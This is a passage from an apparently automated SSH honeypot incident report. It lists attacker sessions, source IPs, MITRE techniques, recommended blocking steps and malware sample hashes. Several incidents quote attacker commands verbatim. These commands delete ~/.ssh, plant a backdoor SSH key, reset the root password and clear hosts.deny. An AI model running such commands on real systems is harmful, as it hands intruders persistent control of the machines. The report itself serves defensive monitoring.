| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:39 |
| **Last Seen** | 2026-06-15 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:39:22` | `cowrie.session.connect` |
| `2026-06-15 10:39:22` | `cowrie.client.version` |
| `2026-06-15 10:39:22` | `cowrie.client.kex` |
| `2026-06-15 10:39:23` | `cowrie.login.success` |
| `2026-06-15 10:39:24` | `cowrie.session.params` |
| `2026-06-15 10:39:24` | `cowrie.command.input` |
| `2026-06-15 10:39:24` | `cowrie.log.closed` |
| `2026-06-15 10:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c080bbe1f14d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:40 |
| **Last Seen** | 2026-06-15 10:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:40:28` | `cowrie.session.connect` |
| `2026-06-15 10:40:28` | `cowrie.client.version` |
| `2026-06-15 10:40:28` | `cowrie.client.kex` |
| `2026-06-15 10:40:29` | `cowrie.login.success` |
| `2026-06-15 10:40:29` | `cowrie.session.params` |
| `2026-06-15 10:40:29` | `cowrie.command.input` |
| `2026-06-15 10:40:29` | `cowrie.log.closed` |
| `2026-06-15 10:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52c72394f1cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:41 |
| **Last Seen** | 2026-06-15 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:41:03` | `cowrie.session.connect` |
| `2026-06-15 10:41:03` | `cowrie.client.version` |
| `2026-06-15 10:41:03` | `cowrie.client.kex` |
| `2026-06-15 10:41:04` | `cowrie.login.success` |
| `2026-06-15 10:41:04` | `cowrie.session.params` |
| `2026-06-15 10:41:04` | `cowrie.command.input` |
| `2026-06-15 10:41:05` | `cowrie.log.closed` |
| `2026-06-15 10:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af4e0bd45034

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:41 |
| **Last Seen** | 2026-06-15 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:41:21` | `cowrie.session.connect` |
| `2026-06-15 10:41:21` | `cowrie.client.version` |
| `2026-06-15 10:41:21` | `cowrie.client.kex` |
| `2026-06-15 10:41:21` | `cowrie.login.success` |
| `2026-06-15 10:41:22` | `cowrie.session.params` |
| `2026-06-15 10:41:22` | `cowrie.command.input` |
| `2026-06-15 10:41:22` | `cowrie.log.closed` |
| `2026-06-15 10:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a96047c740

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:42 |
| **Last Seen** | 2026-06-15 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:42:13` | `cowrie.session.connect` |
| `2026-06-15 10:42:13` | `cowrie.client.version` |
| `2026-06-15 10:42:13` | `cowrie.client.kex` |
| `2026-06-15 10:42:14` | `cowrie.login.success` |
| `2026-06-15 10:42:15` | `cowrie.session.params` |
| `2026-06-15 10:42:15` | `cowrie.command.input` |
| `2026-06-15 10:42:15` | `cowrie.log.closed` |
| `2026-06-15 10:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83ac7e702096

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:42 |
| **Last Seen** | 2026-06-15 10:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:42:43` | `cowrie.session.connect` |
| `2026-06-15 10:42:43` | `cowrie.client.version` |
| `2026-06-15 10:42:43` | `cowrie.client.kex` |
| `2026-06-15 10:42:44` | `cowrie.login.success` |
| `2026-06-15 10:42:45` | `cowrie.session.params` |
| `2026-06-15 10:42:45` | `cowrie.command.input` |
| `2026-06-15 10:42:45` | `cowrie.log.closed` |
| `2026-06-15 10:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccb9c0eb668

| Field | Detail |
|---|---|
| **Source IP** | `135.235.138[.]43` |
| **First Seen** | 2026-06-15 11:22 |
| **Last Seen** | 2026-06-15 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 11:22:39` | `cowrie.session.connect` |
| `2026-06-15 11:22:39` | `cowrie.client.version` |
| `2026-06-15 11:22:39` | `cowrie.client.kex` |
| `2026-06-15 11:22:39` | `cowrie.login.success` |
| `2026-06-15 11:22:39` | `cowrie.session.params` |
| `2026-06-15 11:22:39` | `cowrie.command.input` |
| `2026-06-15 11:22:39` | `cowrie.command.failed` |
| `2026-06-15 11:22:39` | `cowrie.log.closed` |
| `2026-06-15 11:22:40` | `cowrie.session.params` |
| `2026-06-15 11:22:40` | `cowrie.command.input` |
| `2026-06-15 11:22:40` | `cowrie.session.file_download` |
| `2026-06-15 11:22:40` | `cowrie.log.closed` |
| `2026-06-15 11:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.235.138[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.235.138[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14862b6d169b

| Field | Detail |
|---|---|
| **Source IP** | `135.235.138[.]43` |
| **First Seen** | 2026-06-15 11:22 |
| **Last Seen** | 2026-06-15 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 11:22:41` | `cowrie.session.connect` |
| `2026-06-15 11:22:41` | `cowrie.client.version` |
| `2026-06-15 11:22:41` | `cowrie.client.kex` |
| `2026-06-15 11:22:41` | `cowrie.login.success` |
| `2026-06-15 11:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.235.138[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.235.138[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc14a258bcf

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-06-15 11:22 |
| **Last Seen** | 2026-06-15 11:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 11:22:52` | `cowrie.session.connect` |
| `2026-06-15 11:22:52` | `cowrie.client.version` |
| `2026-06-15 11:22:52` | `cowrie.client.kex` |
| `2026-06-15 11:22:52` | `cowrie.login.success` |
| `2026-06-15 11:22:53` | `cowrie.session.params` |
| `2026-06-15 11:22:53` | `cowrie.command.input` |
| `2026-06-15 11:22:53` | `cowrie.command.failed` |
| `2026-06-15 11:22:53` | `cowrie.log.closed` |
| `2026-06-15 11:22:53` | `cowrie.session.params` |
| `2026-06-15 11:22:53` | `cowrie.command.input` |
| `2026-06-15 11:22:53` | `cowrie.session.file_download` |
| `2026-06-15 11:22:53` | `cowrie.log.closed` |
| `2026-06-15 11:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c16435bd09

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-06-15 11:22 |
| **Last Seen** | 2026-06-15 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 11:22:56` | `cowrie.session.connect` |
| `2026-06-15 11:22:56` | `cowrie.client.version` |
| `2026-06-15 11:22:56` | `cowrie.client.kex` |
| `2026-06-15 11:22:56` | `cowrie.login.success` |
| `2026-06-15 11:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4339c303e40e

| Field | Detail |
|---|---|
| **Source IP** | `135.235.138[.]43` |
| **First Seen** | 2026-06-15 11:27 |
| **Last Seen** | 2026-06-15 11:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Z5C0eEAtDNGv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 11:27:08` | `cowrie.session.connect` |
| `2026-06-15 11:27:08` | `cowrie.client.version` |
| `2026-06-15 11:27:08` | `cowrie.client.kex` |
| `2026-06-15 11:27:08` | `cowrie.login.success` |
| `2026-06-15 11:27:08` | `cowrie.session.params` |
| `2026-06-15 11:27:08` | `cowrie.command.input` |
| `2026-06-15 11:27:08` | `cowrie.command.failed` |
| `2026-06-15 11:27:08` | `cowrie.log.closed` |
| `2026-06-15 11:27:08` | `cowrie.session.params` |
| `2026-06-15 11:27:08` | `cowrie.command.input` |
| `2026-06-15 11:27:08` | `cowrie.session.file_download` |
| `2026-06-15 11:27:08` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.session.file_download` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:18` | `cowrie.session.params` |
| `2026-06-15 11:27:18` | `cowrie.command.input` |
| `2026-06-15 11:27:18` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.params` |
| `2026-06-15 11:27:19` | `cowrie.command.input` |
| `2026-06-15 11:27:19` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.params` |
| `2026-06-15 11:27:19` | `cowrie.command.input` |
| `2026-06-15 11:27:19` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.params` |
| `2026-06-15 11:27:19` | `cowrie.command.input` |
| `2026-06-15 11:27:19` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.params` |
| `2026-06-15 11:27:19` | `cowrie.command.input` |
| `2026-06-15 11:27:19` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.params` |
| `2026-06-15 11:27:19` | `cowrie.command.input` |
| `2026-06-15 11:27:19` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.params` |
| `2026-06-15 11:27:19` | `cowrie.command.input` |
| `2026-06-15 11:27:19` | `cowrie.log.closed` |
| `2026-06-15 11:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.235.138[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.235.138[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.92.40[.]151` | **55** | 2026-06-15 10:35 | 2026-06-15 10:44 | 6m | 54 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.244.172[.]236` | **25** | 2026-06-15 12:04 | 2026-06-15 12:09 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.183.62[.]1` | **8** | 2026-06-15 05:28 | 2026-06-15 06:07 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `103.183.62[.]2` | **7** | 2026-06-15 05:36 | 2026-06-15 06:03 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `157.230.150[.]187` | **6** | 2026-06-15 06:17 | 2026-06-15 08:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `135.235.138[.]43` | **4** | 2026-06-15 10:07 | 2026-06-15 11:27 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `8.216.5[.]176` | **4** | 2026-06-15 06:11 | 2026-06-15 06:12 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `118.193.44[.]112` | **3** | 2026-06-15 08:04 | 2026-06-15 08:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `128.14.225[.]164` | **3** | 2026-06-15 10:42 | 2026-06-15 10:46 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `78.128.112[.]74` | **3** | 2026-06-15 09:03 | 2026-06-15 09:03 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.183.62[.]0` | **2** | 2026-06-15 06:18 | 2026-06-15 06:23 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.41[.]106` | **2** | 2026-06-15 10:28 | 2026-06-15 10:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]115` | **2** | 2026-06-15 07:36 | 2026-06-15 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `216.70.97[.]74` | **2** | 2026-06-15 12:14 | 2026-06-15 12:17 | 1m | 0 | `T1592` | 🟢 LOW |
| `3.20.225[.]240` | **2** | 2026-06-15 08:22 | 2026-06-15 08:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.114.57[.]2` | **2** | 2026-06-15 05:00 | 2026-06-15 05:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `51.83.40[.]102` | **2** | 2026-06-15 12:08 | 2026-06-15 12:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `61.76.38[.]54` | **2** | 2026-06-15 10:09 | 2026-06-15 11:22 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.182.149[.]106` | 1 | 2026-06-15 07:59 | 2026-06-15 07:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.172.20[.]218` | 1 | 2026-06-15 07:35 | 2026-06-15 07:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.187.147[.]214` | 1 | 2026-06-15 10:07 | 2026-06-15 10:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.69[.]159` | 1 | 2026-06-15 07:35 | 2026-06-15 07:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.239.31[.]116` | 1 | 2026-06-15 07:09 | 2026-06-15 07:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `111.127.64[.]137` | 1 | 2026-06-15 10:40 | 2026-06-15 10:40 | 14s | 0 | `T1592` | 🟢 LOW |
| `111.17.199[.]57` | 1 | 2026-06-15 07:39 | 2026-06-15 07:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.160[.]80` | 1 | 2026-06-15 10:33 | 2026-06-15 10:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.203.251[.]187` | 1 | 2026-06-15 11:09 | 2026-06-15 11:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.96.81[.]99` | 1 | 2026-06-15 10:10 | 2026-06-15 10:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.46.184[.]6` | 1 | 2026-06-15 08:23 | 2026-06-15 08:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.9[.]97` | 1 | 2026-06-15 10:37 | 2026-06-15 10:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.244.62[.]87` | 1 | 2026-06-15 10:09 | 2026-06-15 10:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.113[.]53` | 1 | 2026-06-15 07:37 | 2026-06-15 07:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.99.148[.]102` | 1 | 2026-06-15 06:55 | 2026-06-15 06:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.79.182[.]237` | 1 | 2026-06-15 08:43 | 2026-06-15 08:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]58` | 1 | 2026-06-15 08:14 | 2026-06-15 08:14 | 1s | 0 | `T1592` | 🟢 LOW |
| `190.181.44[.]194` | 1 | 2026-06-15 05:29 | 2026-06-15 05:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.191[.]5` | 1 | 2026-06-15 12:12 | 2026-06-15 12:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.168.126[.]136` | 1 | 2026-06-15 07:30 | 2026-06-15 07:30 | 14s | 0 | `T1592` | 🟢 LOW |
| `206.135.22[.]34` | 1 | 2026-06-15 10:18 | 2026-06-15 10:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `219.128.75[.]174` | 1 | 2026-06-15 07:28 | 2026-06-15 07:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.112.46[.]78` | 1 | 2026-06-15 04:57 | 2026-06-15 04:57 | 30s | 0 | `T1592` | 🟢 LOW |
| `222.73.56[.]10` | 1 | 2026-06-15 10:05 | 2026-06-15 10:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `24.163.114[.]60` | 1 | 2026-06-15 09:10 | 2026-06-15 09:11 | 30s | 0 | `T1592` | 🟢 LOW |
| `36.26.74[.]162` | 1 | 2026-06-15 07:41 | 2026-06-15 07:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.49.51[.]173` | 1 | 2026-06-15 09:21 | 2026-06-15 09:21 | 14s | 0 | `T1592` | 🟢 LOW |
| `4.240.82[.]91` | 1 | 2026-06-15 10:15 | 2026-06-15 10:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.199.224[.]2` | 1 | 2026-06-15 12:03 | 2026-06-15 12:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-06-15 05:06 | 2026-06-15 05:06 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
